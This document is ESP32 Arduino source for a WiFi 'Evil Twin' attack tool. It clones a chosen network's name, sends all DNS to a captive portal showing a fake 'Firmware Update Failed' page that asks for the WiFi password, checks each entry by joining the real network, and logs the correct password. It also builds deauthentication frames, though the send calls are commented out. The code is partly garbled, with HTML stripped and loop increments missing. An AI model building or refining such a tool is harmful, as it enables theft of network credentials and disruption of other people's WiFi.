#include #include #include #include
// Function declaration for external functions used in loop() and handlers extern "C" { // We'll assume the user has defined or is using a function like this for deauth packets // int wifi_send_pkt_freedom(const uint8_t *buf, size_t len, int sys_queue); }
// Helper function to convert a byte array (like BSSID) to a colon-separated hex string String bytesToStr(const uint8_t* b, uint32_t size) { String str; const char ZERO = '0'; const char DOUBLEPOINT = ':'; for (uint32_t i = 0; i < size; i++) { if (b[i] < 0x10) str += ZERO; str += String(b[i], HEX);
if (i < size - 1) str += DOUBLEPOINT;
} return str; }
typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; } _Network;
const byte DNS_PORT = 53; IPAddress apIP(192, 168, 1, 1); DNSServer dnsServer; WebServer webServer(80);
_Network _networks[16]; _Network _selectedNetwork;
void clearArray() { for (int i = 0; i < 16; i++) { _Network _network; _networks[i] = _network; } }
String _correct = ""; String _tryPassword = "";
// Default main strings #define SUBTITLE "ACCESS POINT RESCUE MODE" #define TITLE "⚠ Firmware Update Failed" #define BODY "Your router encountered a problem while automatically installing the latest Anirudha update.

To revert the old firmware and manually update later, please verify your password."
String header(String t) { String a = String(_selectedNetwork.ssid); String CSS = "article { background: #f2f2f2; padding: 1.3em; }" "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }" "div { padding: 0.5em; }" "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}" "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }" "label { color: #333; display: block; font-style: italic; font-weight: bold; }" "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }" "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } " "textarea { width: 100%; }"; String h = "" "" "" "" "" "
" + a + " " + SUBTITLE + "

" + t + "

"; return h; }String footer() { return "
© All rights reserved.
"; }String index() { return header(TITLE) + "
" + BODY + "
WiFi password:" + "

" + footer(); }void performScan() { int n = WiFi.scanNetworks(); clearArray(); if (n >= 0) { for (int i = 0; i < n && i < 16; i) { _Network network; network.ssid = WiFi.SSID(i); for (int j = 0; j < 6; j) { network.bssid[j] = WiFi.BSSID(i)[j]; } network.ch = WiFi.channel(i); _networks[i] = network; } } }
bool hotspot_active = false; bool deauthing_active = false;
void handleResult() { String html = ""; if (WiFi.status() != WL_CONNECTED) { if (webServer.arg("deauth") == "start") { deauthing_active = true; } webServer.send(200, "text/html", "

⊗
Wrong Password
Please, try again.
"); Serial.println("Wrong password tried!"); } else { _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword; hotspot_active = false; dnsServer.stop(); int n = WiFi.softAPdisconnect (true); Serial.println(String(n)); // Revert to the default AP settings WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0)); WiFi.softAP("alex", "12345678"); // Changed to new default dnsServer.start(53, "*", IPAddress(192, 168, 4, 1)); Serial.println("Good password was entered !"); Serial.println(_correct); } }String _tempHTML = "" "" "
" "" "{deauth_button}" "" "{hotspot_button}" "

";void handleIndex() {
if (webServer.hasArg("ap")) { for (int i = 0; i < 16; i++) { if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) { _selectedNetwork = _networks[i]; } } }
if (webServer.hasArg("deauth")) { if (webServer.arg("deauth") == "start") { deauthing_active = true; } else if (webServer.arg("deauth") == "stop") { deauthing_active = false; } }
if (webServer.hasArg("hotspot")) { if (webServer.arg("hotspot") == "start") { hotspot_active = true;
dnsServer.stop();
int n = WiFi.softAPdisconnect (true);
Serial.println(String(n));
WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
WiFi.softAP(_selectedNetwork.ssid.c_str());
dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
} else if (webServer.arg("hotspot") == "stop") {
hotspot_active = false;
dnsServer.stop();
int n = WiFi.softAPdisconnect (true);
Serial.println(String(n));
// Revert to the default AP settings
WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
WiFi.softAP("alex", "12345678"); // Changed to new default
dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
}
return;
}
if (hotspot_active == false) { String _html = _tempHTML;
for (int i = 0; i < 16; ++i) {
if ( _networks[i].ssid == "") {
break;
}
_html += "

";} else {
_html += "Select";
}
}
if (deauthing_active) {
_html.replace("{deauth_button}", "Stop deauthing");
_html.replace("{deauth}", "stop");
} else {
_html.replace("{deauth_button}", "Start deauthing");
_html.replace("{deauth}", "start");
}
if (hotspot_active) {
_html.replace("{hotspot_button}", "Stop EvilTwin");
_html.replace("{hotspot}", "stop");
} else {
_html.replace("{hotspot_button}", "Start EvilTwin");
_html.replace("{hotspot}", "start");
}
if (_selectedNetwork.ssid == "") {
_html.replace("{disabled}", " disabled");
} else {
_html.replace("{disabled}", "");
}
_html += "
SSIDBSSIDChannelSelect" + _networks[i].ssid + "" + bytesToStr(_networks[i].bssid, 6) + "" + String(_networks[i].ch) + "";if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
_html += "Selected
";if (_correct != "") {
_html += "

" + _correct + "
";}
_html += "
";webServer.send(200, "text/html", _html);
} else {
if (webServer.hasArg("password")) {
_tryPassword = webServer.arg("password");
if (webServer.arg("deauth") == "start") {
deauthing_active = false;
}
delay(1000);
WiFi.disconnect();
WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
webServer.send(200, "text/html", "

Verifying integrity, please wait...

");if (webServer.arg("deauth") == "start") {
deauthing_active = true;
}
} else {
webServer.send(200, "text/html", index());
}
}
}
void handleAdmin() {
String _html = _tempHTML;
if (webServer.hasArg("ap")) { for (int i = 0; i < 16; i++) { if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) { _selectedNetwork = _networks[i]; } } }
if (webServer.hasArg("deauth")) { if (webServer.arg("deauth") == "start") { deauthing_active = true; } else if (webServer.arg("deauth") == "stop") { deauthing_active = false; } }
if (webServer.hasArg("hotspot")) { if (webServer.arg("hotspot") == "start") { hotspot_active = true;
dnsServer.stop();
int n = WiFi.softAPdisconnect (true);
Serial.println(String(n));
WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
WiFi.softAP(_selectedNetwork.ssid.c_str());
dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
} else if (webServer.arg("hotspot") == "stop") {
hotspot_active = false;
dnsServer.stop();
int n = WiFi.softAPdisconnect (true);
Serial.println(String(n));
// Revert to the default AP settings
WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
WiFi.softAP("alex", "12345678"); // Changed to new default
dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
}
return;
}
for (int i = 0; i < 16; ++i) { if ( _networks[i].ssid == "") { break; } _html += "" + _networks[i].ssid + "" + bytesToStr(_networks[i].bssid, 6) + "" + String(_networks[i].ch) + "
";if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
_html += "Selected
";} else {
_html += "Select";
}
}
if (deauthing_active) { _html.replace("{deauth_button}", "Stop deauthing"); _html.replace("{deauth}", "stop"); } else { _html.replace("{deauth_button}", "Start deauthing"); _html.replace("{deauth}", "start"); }
if (hotspot_active) { _html.replace("{hotspot_button}", "Stop EvilTwin"); _html.replace("{hotspot}", "stop"); } else { _html.replace("{hotspot_button}", "Start EvilTwin"); _html.replace("{hotspot}", "start"); }
if (_selectedNetwork.ssid == "") { _html.replace("{disabled}", " disabled"); } else { _html.replace("{disabled}", ""); }
if (_correct != "") { _html += "

" + _correct + "
"; }_html += "
"; webServer.send(200, "text/html", _html);}
void setup() { Serial.begin(115200); WiFi.mode(WIFI_AP_STA); WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
// ------------------------------------ // --- UPDATED DEFAULT AP SETTINGS --- // ------------------------------------ WiFi.softAP("alex", "12345678");
dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
webServer.on("/", handleIndex); webServer.on("/result", handleResult); webServer.on("/admin", handleAdmin); webServer.onNotFound(handleIndex); webServer.begin(); }
unsigned long now = 0; unsigned long wifinow = 0; unsigned long deauth_now = 0;
uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }; uint8_t wifi_channel = 1;
void loop() { dnsServer.processNextRequest(); webServer.handleClient();
if (deauthing_active && millis() - deauth_now >= 1000) { int channel = _selectedNetwork.ch; if (channel >= 1 && channel <= 13) { WiFi.setChannel(channel); } uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
deauthPacket[24] = 1;
Serial.println(bytesToStr(deauthPacket, 26));
deauthPacket[0] = 0xC0;
// The required function 'wifi_send_pkt_freedom' is commented out or missing its declaration/definition
// from the core Arduino libraries for ESP32 and would require custom headers/firmware.
// Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
// Serial.println(bytesToStr(deauthPacket, 26));
deauthPacket[0] = 0xA0;
// Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
deauth_now = millis();
}
if (millis() - now >= 15000) { performScan(); now = millis(); }
if (millis() - wifinow >= 2000) { if (WiFi.status() != WL_CONNECTED) { Serial.println("BAD"); } else { Serial.println("GOOD"); } wifinow = millis(); } }
modifed it and reset all proxy